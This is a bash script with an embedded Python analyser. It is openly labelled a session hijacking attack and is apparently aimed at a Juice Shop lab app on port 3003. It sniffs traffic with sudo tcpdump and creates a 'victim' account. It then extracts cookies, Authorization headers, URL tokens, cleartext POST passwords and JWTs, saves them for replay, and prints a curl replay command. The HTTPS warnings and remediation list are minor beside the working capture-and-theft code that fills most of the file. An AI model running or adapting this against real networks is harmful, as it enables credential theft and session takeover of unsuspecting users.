#!/bin/bash
# Advanced Session Hijacking Attack Script
# Real-time session interception with cookie theft and token extraction
# Demonstrates packet sniffing, session token analysis, and vulnerability detection
set -euo pipefail

TARGET="$1"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
ARTIFACTS_PATH="${ARTIFACTS_PATH:-/workspaces/cns/artifacts}"
OUTPUT_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.txt"
PCAP_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.pcap"
JSON_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.json"
COOKIES_FILE="${ARTIFACTS_PATH}/session-cookies-${TARGET}-${TIMESTAMP}.txt"
TOKENS_FILE="${ARTIFACTS_PATH}/session-tokens-${TARGET}-${TIMESTAMP}.txt"
ANALYSIS_SCRIPT="/tmp/session_analyzer_${TIMESTAMP}.py"

echo "╔══════════════════════════════════════════════════════════════╗" | tee "$OUTPUT_FILE"
echo "║     ADVANCED SESSION HIJACKING ATTACK                        ║" | tee -a "$OUTPUT_FILE"
echo "║     Real-Time Cookie Theft & Token Extraction                ║" | tee -a "$OUTPUT_FILE"
echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "Target: $TARGET:3003" | tee -a "$OUTPUT_FILE"
echo "Timestamp: $(date)" | tee -a "$OUTPUT_FILE"
echo "Capture Duration: 45 seconds" | tee -a "$OUTPUT_FILE"
echo "Attack Type: Man-in-the-Middle (Passive Sniffing)" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Ensure artifacts directory exists
mkdir -p "$ARTIFACTS_PATH"

# Create advanced Python analyzer for deep packet inspection
cat > "$ANALYSIS_SCRIPT" << 'PYTHON_EOF'
#!/usr/bin/env python3
import json
import re
import sys
from datetime import datetime
from base64 import b64decode
import urllib.parse

def analyze_pcap(pcap_file, output_json, cookies_file, tokens_file):
    """Advanced session analysis using tshark"""
    
    cookies = []
    tokens = []
    credentials = []
    sessions = {}
    vulnerabilities = []
    
    print("[*] Analyzing captured packets with TShark...")
    
    import subprocess
    
    # Extract HTTP traffic with tshark
    try:
        # Get all HTTP requests
        result = subprocess.run([
            'tshark', '-r', pcap_file, '-Y', 'http', '-T', 'fields',
            '-e', 'http.cookie', '-e', 'http.set_cookie', '-e', 'http.authorization',
            '-e', 'http.request.uri', '-e', 'http.host', '-e', 'ip.src', '-e', 'ip.dst',
            '-e', 'http.request.method', '-e', 'http.user_agent'
        ], capture_output=True, text=True, timeout=30)
        
        lines = result.stdout.strip().split('\n')
        
        for line in lines:
            if not line.strip():
                continue
                
            fields = line.split('\t')
            if len(fields) < 5:
                continue
            
            # Extract cookies from requests
            if fields[0]:
                for cookie in fields[0].split(';'):
                    cookie = cookie.strip()
                    if cookie and '=' in cookie:
                        name, value = cookie.split('=', 1)
                        cookie_data = {
                            'name': name.strip(),
                            'value': value.strip(),
                            'source': 'request',
                            'timestamp': datetime.now().isoformat()
                        }
                        cookies.append(cookie_data)
                        vulnerabilities.append({
                            'type': 'Unencrypted Cookie Transmission',
                            'severity': 'HIGH',
                            'cookie': name.strip(),
                            'detail': 'Cookie transmitted over HTTP without encryption'
                        })
            
            # Extract Set-Cookie headers
            if fields[1]:
                for set_cookie in fields[1].split(';'):
                    if '=' in set_cookie:
                        name, value = set_cookie.split('=', 1)
                        cookie_data = {
                            'name': name.strip(),
                            'value': value.strip(),
                            'source': 'response',
                            'timestamp': datetime.now().isoformat(),
                            'flags': {
                                'secure': 'Secure' in set_cookie,
                                'httponly': 'HttpOnly' in set_cookie,
                                'samesite': 'SameSite' in set_cookie
                            }
                        }
                        cookies.append(cookie_data)
                        
                        # Check for insecure cookies
                        if not cookie_data['flags']['secure']:
                            vulnerabilities.append({
                                'type': 'Missing Secure Flag',
                                'severity': 'HIGH',
                                'cookie': name.strip(),
                                'detail': 'Cookie missing Secure flag - vulnerable to MITM'
                            })
                        if not cookie_data['flags']['httponly']:
                            vulnerabilities.append({
                                'type': 'Missing HttpOnly Flag',
                                'severity': 'MEDIUM',
                                'cookie': name.strip(),
                                'detail': 'Cookie accessible via JavaScript - XSS risk'
                            })
            
            # Extract authorization headers
            if fields[2]:
                auth_data = {
                    'type': 'Authorization Header',
                    'value': fields[2][:50] + '...' if len(fields[2]) > 50 else fields[2],
                    'full_value': fields[2],
                    'timestamp': datetime.now().isoformat()
                }
                tokens.append(auth_data)
                vulnerabilities.append({
                    'type': 'Unencrypted Authentication',
                    'severity': 'CRITICAL',
                    'detail': 'Authorization header sent over HTTP'
                })
            
            # Extract session tokens from URLs
            if fields[3]:
                uri = fields[3]
                # Check for tokens in URLs
                token_patterns = [
                    r'token=([^&\s]+)',
                    r'session=([^&\s]+)',
                    r'sid=([^&\s]+)',
                    r'auth=([^&\s]+)',
                    r'jwt=([^&\s]+)',
                    r'access_token=([^&\s]+)'
                ]
                for pattern in token_patterns:
                    matches = re.findall(pattern, uri, re.IGNORECASE)
                    for match in matches:
                        tokens.append({
                            'type': 'URL Token',
                            'value': match[:30] + '...' if len(match) > 30 else match,
                            'full_value': match,
                            'location': 'URL parameter',
                            'timestamp': datetime.now().isoformat()
                        })
                        vulnerabilities.append({
                            'type': 'Token in URL',
                            'severity': 'HIGH',
                            'detail': 'Session token exposed in URL - logged in history/logs'
                        })
        
        # Extract POST data (credentials and tokens)
        post_result = subprocess.run([
            'tshark', '-r', pcap_file, '-Y', 'http.request.method == "POST"',
            '-T', 'fields', '-e', 'http.file_data', '-e', 'http.request.uri'
        ], capture_output=True, text=True, timeout=30)
        
        for line in post_result.stdout.split('\n'):
            if not line.strip():
                continue
            # Check for credentials in POST data
            if 'password' in line.lower() or 'passwd' in line.lower() or 'pwd' in line.lower():
                credentials.append({
                    'type': 'HTTP POST Credentials',
                    'data': line[:100] + '...' if len(line) > 100 else line,
                    'timestamp': datetime.now().isoformat()
                })
                vulnerabilities.append({
                    'type': 'Credentials Over HTTP',
                    'severity': 'CRITICAL',
                    'detail': 'Password transmitted in cleartext over HTTP'
                })
        
        # Extract response bodies (JWT tokens)
        response_result = subprocess.run([
            'tshark', '-r', pcap_file, '-Y', 'http.response',
            '-T', 'fields', '-e', 'http.file_data'
        ], capture_output=True, text=True, timeout=30)
        
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        for line in response_result.stdout.split('\n'):
            # Look for JWT tokens in responses
            jwt_matches = re.findall(jwt_pattern, line)
            for jwt_token in jwt_matches:
                tokens.append({
                    'type': 'JWT Session Token',
                    'value': jwt_token[:50] + '...' if len(jwt_token) > 50 else jwt_token,
                    'full_value': jwt_token,
                    'location': 'HTTP Response Body',
                    'timestamp': datetime.now().isoformat()
                })
                vulnerabilities.append({
                    'type': 'JWT Token Over HTTP',
                    'severity': 'CRITICAL',
                    'detail': 'Session token transmitted without encryption - can be intercepted and reused'
                })
            
            # Look for "token" or "authentication" in JSON responses
            if 'token' in line.lower() or 'authentication' in line.lower():
                tokens.append({
                    'type': 'API Response Token',
                    'value': line[:80] + '...' if len(line) > 80 else line,
                    'full_value': line,
                    'location': 'HTTP Response',
                    'timestamp': datetime.now().isoformat()
                })
        
    except subprocess.TimeoutExpired:
        print("[!] TShark analysis timed out")
    except Exception as e:
        print(f"[!] Analysis error: {e}")
    
    # Generate statistics
    stats = {
        'total_cookies': len(cookies),
        'total_tokens': len(tokens),
        'total_credentials': len(credentials),
        'total_vulnerabilities': len(vulnerabilities),
        'unique_cookies': len(set(c['name'] for c in cookies if 'name' in c)),
        'critical_vulns': len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL']),
        'high_vulns': len([v for v in vulnerabilities if v.get('severity') == 'HIGH']),
        'medium_vulns': len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM'])
    }
    
    # Create detailed report
    report = {
        'attack_info': {
            'type': 'Session Hijacking',
            'method': 'Passive Network Sniffing',
            'timestamp': datetime.now().isoformat(),
            'pcap_file': pcap_file
        },
        'statistics': stats,
        'cookies': cookies[:50],  # Limit to first 50
        'tokens': tokens[:50],
        'credentials': credentials[:20],
        'vulnerabilities': vulnerabilities,
        'risk_assessment': {
            'overall_risk': 'CRITICAL' if stats['critical_vulns'] > 0 else 'HIGH' if stats['high_vulns'] > 0 else 'MEDIUM',
            'exploitability': 'Easy' if stats['total_cookies'] > 0 or stats['total_tokens'] > 0 else 'Moderate',
            'impact': 'Complete session takeover possible' if stats['total_cookies'] > 3 else 'Limited session access'
        },
        'recommendations': [
            '1. IMMEDIATELY migrate to HTTPS/TLS for all traffic',
            '2. Set Secure flag on all cookies',
            '3. Set HttpOnly flag to prevent XSS',
            '4. Implement SameSite=Strict on cookies',
            '5. Never transmit credentials over HTTP',
            '6. Use strong session tokens (256+ bits entropy)',
            '7. Implement session binding to IP/User-Agent',
            '8. Add session timeout and regeneration',
            '9. Monitor for suspicious session patterns',
            '10. Deploy HSTS headers'
        ]
    }
    
    # Save JSON report
    with open(output_json, 'w') as f:
        json.dump(report, f, indent=2)
    
    # Save cookies to file
    with open(cookies_file, 'w') as f:
        f.write("# Captured Session Cookies\n")
        f.write(f"# Total: {len(cookies)}\n")
        f.write(f"# Timestamp: {datetime.now()}\n\n")
        for cookie in cookies:
            if 'name' in cookie and 'value' in cookie:
                f.write(f"{cookie['name']}={cookie['value']}\n")
    
    # Save tokens to file
    with open(tokens_file, 'w') as f:
        f.write("# Captured Session Tokens\n")
        f.write(f"# Total: {len(tokens)}\n")
        f.write(f"# Timestamp: {datetime.now()}\n\n")
        for token in tokens:
            if 'full_value' in token:
                f.write(f"{token['type']}: {token['full_value']}\n")
    
    return report

if __name__ == '__main__':
    if len(sys.argv) < 5:
        print("Usage: script.py <pcap_file> <json_output> <cookies_file> <tokens_file>")
        sys.exit(1)
    
    report = analyze_pcap(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    
    print(f"\n[+] Analysis complete!")
    print(f"[+] Cookies captured: {report['statistics']['total_cookies']}")
    print(f"[+] Tokens captured: {report['statistics']['total_tokens']}")
    print(f"[+] Vulnerabilities found: {report['statistics']['total_vulnerabilities']}")
    print(f"[+] Risk Level: {report['risk_assessment']['overall_risk']}")
PYTHON_EOF

chmod +x "$ANALYSIS_SCRIPT"

echo "[PHASE 1] Starting Advanced Packet Capture" | tee -a "$OUTPUT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"

# Determine correct interface and filter
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    INTERFACE="lo"
    CAPTURE_FILTER="tcp port 3003"
    echo "[*] Capturing on loopback interface (lo)..." | tee -a "$OUTPUT_FILE"
else
    INTERFACE="any"
    CAPTURE_FILTER="host $TARGET and tcp port 3003"
    echo "[*] Capturing on all interfaces..." | tee -a "$OUTPUT_FILE"
fi

echo "[*] Filter: $CAPTURE_FILTER" | tee -a "$OUTPUT_FILE"
echo "[*] Duration: 60 seconds (with active traffic generation)" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Start packet capture in background using tcpdump (more reliable than tshark)
(
    sudo tcpdump -i "$INTERFACE" -w "$PCAP_FILE" "$CAPTURE_FILTER" 2>/dev/null &
    TCPDUMP_PID=$!
    sleep 60
    sudo kill -TERM $TCPDUMP_PID 2>/dev/null || true
    wait $TCPDUMP_PID 2>/dev/null || true
) &

CAPTURE_BG_PID=$!

# Wait for tcpdump to initialize
echo "[*] Initializing packet capture..." | tee -a "$OUTPUT_FILE"
sleep 3

# Generate realistic attack traffic
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    echo "[PHASE 2] Generating Traffic & Stealing Sessions" | tee -a "$OUTPUT_FILE"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"
    echo "[*] Simulating user activity to capture active sessions..." | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    
    # Register a test user first
    echo "[*] Creating test user account..." | tee -a "$OUTPUT_FILE"
    REGISTER_RESPONSE=$(curl -s -c /tmp/cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/api/Users/" \
        -H "Content-Type: application/json" \
        -d '{"email":"victim'${TIMESTAMP}'@hijack.test","password":"Victim123!","passwordRepeat":"Victim123!","securityQuestion":{"id":1},"securityAnswer":"blue"}' 2>/dev/null || echo "{}")
    sleep 2
    
    # Login attempt - this generates JWT tokens
    echo "[*] Intercepting login with credentials..." | tee -a "$OUTPUT_FILE"
    LOGIN_RESPONSE=$(curl -s -c /tmp/cookies_${TIMESTAMP}.txt -b /tmp/cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"victim'${TIMESTAMP}'@hijack.test","password":"Victim123!"}' 2>/dev/null || echo "{}")
    
    # Extract JWT token from response (Juice Shop uses JWT in body, not cookies)
    JWT_TOKEN=$(echo "$LOGIN_RESPONSE" | jq -r '.authentication.token // empty' 2>/dev/null)
    if [ ! -z "$JWT_TOKEN" ] && [ "$JWT_TOKEN" != "null" ]; then
        echo "[+] JWT Session Token captured: ${JWT_TOKEN:0:50}..." | tee -a "$OUTPUT_FILE"
        # Save token to use in subsequent requests
        echo "Authorization: Bearer $JWT_TOKEN" > /tmp/auth_header_${TIMESTAMP}.txt
    fi
    sleep 2
    
    # Browse products with auth token
    echo "[*] Capturing authenticated product browsing..." | tee -a "$OUTPUT_FILE"
    for i in {1..5}; do
        if [ ! -z "$JWT_TOKEN" ]; then
            curl -s -H "Authorization: Bearer $JWT_TOKEN" \
                -b /tmp/cookies_${TIMESTAMP}.txt \
                "http://$TARGET:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
        else
            curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
                "http://$TARGET:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
        fi
        sleep 1
    done
    
    # Add to basket with auth
    echo "[*] Intercepting basket operations..." | tee -a "$OUTPUT_FILE"
    if [ ! -z "$JWT_TOKEN" ]; then
        curl -s -H "Authorization: Bearer $JWT_TOKEN" \
            -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/api/BasketItems/" \
            -H "Content-Type: application/json" \
            -d '{"ProductId":1,"quantity":1}' > /dev/null 2>&1 || true
    fi
    sleep 1
    
    # Get challenges with auth
    echo "[*] Capturing authenticated API requests..." | tee -a "$OUTPUT_FILE"
    if [ ! -z "$JWT_TOKEN" ]; then
        curl -s -H "Authorization: Bearer $JWT_TOKEN" \
            -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/api/Challenges" > /dev/null 2>&1 || true
        curl -s -H "Authorization: Bearer $JWT_TOKEN" \
            -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/rest/basket/1" > /dev/null 2>&1 || true
    fi
    sleep 1
    
    # More realistic traffic
    for i in {1..3}; do
        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/" > /dev/null 2>&1 || true
        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/rest/products/$i/reviews" > /dev/null 2>&1 || true
        sleep 2
    done
    
    # Continue generating traffic for full capture duration
    echo "[*] Continuing traffic generation for 40 more seconds..." | tee -a "$OUTPUT_FILE"
    for round in {1..8}; do
        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/rest/products/search?q=apple" > /dev/null 2>&1 || true
        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/api/Quantitys" > /dev/null 2>&1 || true
        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/rest/user/whoami" > /dev/null 2>&1 || true
        sleep 5
    done
    
    echo "[+] Traffic generation complete" | tee -a "$OUTPUT_FILE"
fi

# Wait for capture to complete
echo "[*] Waiting for packet capture to complete..." | tee -a "$OUTPUT_FILE"
wait $CAPTURE_BG_PID 2>/dev/null || true
sleep 2

echo "" | tee -a "$OUTPUT_FILE"
echo "[PHASE 3] Deep Packet Analysis & Session Extraction" | tee -a "$OUTPUT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"
echo "[*] Analyzing captured packets with Python/TShark..." | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Run advanced analysis
python3 "$ANALYSIS_SCRIPT" "$PCAP_FILE" "$JSON_FILE" "$COOKIES_FILE" "$TOKENS_FILE" 2>&1 | tee -a "$OUTPUT_FILE"

echo "" | tee -a "$OUTPUT_FILE"
echo "[PHASE 4] Vulnerability Assessment" | tee -a "$OUTPUT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Display results using jq
if [ -f "$JSON_FILE" ]; then
    echo "═══ ATTACK STATISTICS ═══" | tee -a "$OUTPUT_FILE"
    jq -r '.statistics | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "═══ CAPTURED COOKIES ═══" | tee -a "$OUTPUT_FILE"
    jq -r '.cookies[:10] | .[] | "  [\(.source)] \(.name) = \(.value[:50])"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "═══ CAPTURED TOKENS ═══" | tee -a "$OUTPUT_FILE"
    jq -r '.tokens[:10] | .[] | "  [\(.type)] \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "═══ CRITICAL VULNERABILITIES ═══" | tee -a "$OUTPUT_FILE"
    jq -r '.vulnerabilities | unique_by(.type) | .[] | "  [\(.severity)] \(.type)\n    → \(.detail)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "═══ RISK ASSESSMENT ═══" | tee -a "$OUTPUT_FILE"
    jq -r '.risk_assessment | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "═══ EXPLOITATION PROOF ═══" | tee -a "$OUTPUT_FILE"
if [ -f "$COOKIES_FILE" ] && [ -s "$COOKIES_FILE" ]; then
    COOKIE_COUNT=$(grep -v '^#' "$COOKIES_FILE" | grep -c '=' || echo "0")
    echo "✓ $COOKIE_COUNT session cookies captured and ready for replay" | tee -a "$OUTPUT_FILE"
    echo "✓ Cookies saved to: $COOKIES_FILE" | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    echo "Attack demonstration:" | tee -a "$OUTPUT_FILE"
    echo "  curl -b '$COOKIES_FILE' http://$TARGET:3003/api/Challenges" | tee -a "$OUTPUT_FILE"
    echo "  ^ This would replay the hijacked session" | tee -a "$OUTPUT_FILE"
else
    echo "⚠ No cookies captured (target may be using HTTPS)" | tee -a "$OUTPUT_FILE"
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "╔══════════════════════════════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
echo "║                   ATTACK COMPLETED                           ║" | tee -a "$OUTPUT_FILE"
echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "📊 ARTIFACTS GENERATED:" | tee -a "$OUTPUT_FILE"
echo "   • Full Report:    $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Packet Capture: $PCAP_FILE" | tee -a "$OUTPUT_FILE"
echo "   • JSON Analysis:  $JSON_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Cookies:        $COOKIES_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Tokens:         $TOKENS_FILE" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "⚠️  WARNING: This demonstrates why HTTPS is mandatory!" | tee -a "$OUTPUT_FILE"
echo "⚠️  Captured sessions can be replayed to impersonate users!" | tee -a "$OUTPUT_FILE"
echo "⚠️  All credentials and cookies transmitted in CLEARTEXT!" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Cleanup
rm -f /tmp/cookies_${TIMESTAMP}.txt "$ANALYSIS_SCRIPT" 2>/dev/null || true

echo "ARTIFACT: $OUTPUT_FILE"
exit 0
